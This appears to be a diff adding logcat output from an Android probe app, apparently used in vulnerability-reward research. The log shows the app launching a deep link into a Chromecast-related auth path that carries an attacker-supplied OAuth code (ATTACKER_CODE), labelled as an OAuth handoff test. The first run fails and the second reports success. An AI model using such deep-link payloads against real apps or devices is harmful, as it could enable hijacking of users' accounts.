@@ -1,0 +1,23 @@
+
+====================================================================================================
+CMD: {"type": "start", "action": "android.intent.action.VIEW", "data": "comgooglecast://chromecast.auth.com/offers?code=ATTACKER_CODE&state=ST", "label": "gh-oauth-handoff"}
+----------------------------------------------------------------------------------------------------
+--------- beginning of main
+10-02 14:04:17.770 20818 20818 I VRPPROBE: == EXEC RECEIVED action=com.vrp.probe.EXEC from ?
+10-02 14:04:17.771 20818 20818 I VRPPROBE: CMD_SOURCE=file /storage/emulated/0/Android/data/com.vrp.probe/files/cmd.json bytes=168
+10-02 14:04:17.771 20818 20818 I VRPPROBE: CMD type=start label=gh-oauth-handoff
+10-02 14:04:17.771 20818 20818 W VRPPROBE: UNKNOWN_TYPE start
+10-02 14:04:17.771 20818 20818 I VRPPROBE: == EXEC DONE
+
+
+====================================================================================================
+CMD: {"type": "start", "action": "android.intent.action.VIEW", "data": "comgooglecast://chromecast.auth.com/offers?code=ATTACKER_CODE&state=ST", "label": "gh-oauth-handoff"}
+----------------------------------------------------------------------------------------------------
+--------- beginning of main
+10-02 14:07:00.075 21235 21235 I VRPPROBE: == EXEC RECEIVED action=com.vrp.probe.EXEC from ?
+10-02 14:07:00.077 21235 21235 I VRPPROBE: CMD_SOURCE=file /storage/emulated/0/Android/data/com.vrp.probe/files/cmd.json bytes=168
+10-02 14:07:00.077 21235 21235 I VRPPROBE: CMD type=start label=gh-oauth-handoff
+10-02 14:07:00.078 21235 21235 I VRPPROBE: START comgooglecast://chromecast.auth.com/offers?code=ATTACKER_CODE&state=ST
+10-02 14:07:00.099 21235 21235 I VRPPROBE:   START_OK
+10-02 14:07:00.099 21235 21235 I VRPPROBE: == EXEC DONE
+
